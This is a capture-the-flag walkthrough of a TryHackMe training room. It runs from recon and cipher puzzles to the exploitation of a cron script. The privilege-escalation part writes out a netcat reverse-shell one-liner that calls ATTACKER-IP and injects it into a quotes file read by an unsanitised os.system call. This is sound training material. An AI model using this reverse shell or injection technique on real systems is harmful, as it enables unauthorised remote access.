# Break-Out-Of-Cage | Tryhackme | Walkthrough 

| Category          | Details               |
|-------------------|-----------------------|
| Platform          | [Break-out-of-cage](https://tryhackme.com/room/breakoutthecage1) |
|  Difficulty       | Easy                  |
| Target machine    | Ubuntu Linux          |
| Attacker Machine  | Kali linux            |
| Tools             | Nmap, Gobuster, [Chiper Identifier](https://www.dcode.fr/cipher-identifier), [Spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram), [Cyber Chef](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://gchq.github.io/CyberChef/&ved=2ahUKEwiY_uzBu4yVAxWzk1YBHT7XNGcQFnoECAwQAQ&usg=AOvVaw3cJhXGWs_4gKkmjmhQLSNC)  |


# Reconnaissance
scan the machine for services and open ports

[Nmap Scan](../Try-Hack-Me/Images/break-out-of-cage/nmap%20scan.png)

nmap results show:
| Port      | Service       |
| --------- |---------------|
| 21/tcp    | ftp           |
| 22/tcp    | ssh           |
| 80/tcp    | http          |

# Enumeration 

Lets check, FTP allows anonymous login

[FTP login](../Try-Hack-Me/Images/break-out-of-cage/ftp%20login.png)

Got a file `dad_tasks`<br>
```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

encoded with `base64`, when decoded it results in an another jumbed text phrase<br>
used [chiper Identifier](https://www.dcode.fr/cipher-identifier) to figure out the chiper used got a many suggestions. Let's keep these aside and drill into the webpage and find any key if possible. 

[Webpage](../Try-Hack-Me/Images/break-out-of-cage/webpage.png)

A simple static page with all page links dead. Lets run gobuster and find any useful directories 
```
# Got the below directories 
/images
/html
/scripts
/auditions
```

Of all the directories `/auditions` has a corrupted audio file.<br>
Checking the file we hear Nicholas Cage talking and a weird noise. After checking the noise in a [spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram) we can see some text:

[Auditions directory](../Try-Hack-Me/Images/break-out-of-cage/auditions%20directory.png)

[Audio Spectrogram](../Try-Hack-Me/Images/break-out-of-cage/audio-file.png)

## cracking password
After all the details collected <br>
we have a key from the audio file and chiper, from the multiple options provided from chiper identifier `Vigenere Cipher` was the best match.

using the word found in the spectogram we can dechiper the vigenere chiper and get the password for `weston`
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... <password_here>
```

# Initial Access

ssh login 
[ssh login](../Try-Hack-Me/Images/break-out-of-cage/ssh%20login.png)

WE ARE IN!!

After logging in, a random message keep appearing from cage annoying 😑.<br>
Let's run `pspy64` and find all the cornjobs running 

[pspy64 list](../Try-Hack-Me/Images/break-out-of-cage/pspy64.png)

Found a scripting runnning at `/opt/.dads_scripts/spread_the_quotes.py` 
```
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
This Python script reads a list of `quotes` from the file `/opt/.dads_scripts/.files/.quotes` and randomly selects one of them using the random module.<br>
It then uses the `wall` command to broadcast the selected quote as a message to all logged-in users on the system. The script executes the command through `os.system()`, which invokes a shell to run wall. <br>
Because the quote is directly concatenated into the shell command without sanitization, the script is vulnerable to command injection if an attacker can modify the contents of the `.quotes` file.

let's create a reverse shell command and inject it into `.quotes` file.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
```
need to send the shell command into `.quotes` file.
```
echo "hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
```

Set up a listener on the attack box 
```
nc -lvnp 4444
```

Wait for sometime, and walla shell into cage!!

[cage shell](../Try-Hack-Me/Images/break-out-of-cage/cage%20login.png)

# Privilege Escalation 

Well the cage user gives us access to user flag at `/home/cage/Super_Duper_Checklist`

The folder email_backup had 3 emails, of which the third one was useful
```
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

<REDACTED>

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

From the 3rd email, a string resembling ciphertext can be observed. The message also mentions that Cage's agent is obsessed with his `face`, which serves as a potential hint toward the decryption key. Based on this clue, the ciphertext can be decoded using the `Vigenère cipher` as it was the same method used to encode the previous password.

It worked got root password!!

The Root Flag is in an email in `/root/email_backup`

[USER FLAG](../Try-Hack-Me/Images/break-out-of-cage/user%20flag.png)

[ROOT FLAG](../Try-Hack-Me/Images/break-out-of-cage/root%20flag.png)

Root flag & User Flag found!<br>
Hope this Walkthrough was fun, easy to follow and helpful to you.<br>

Happy Hacking ~!!!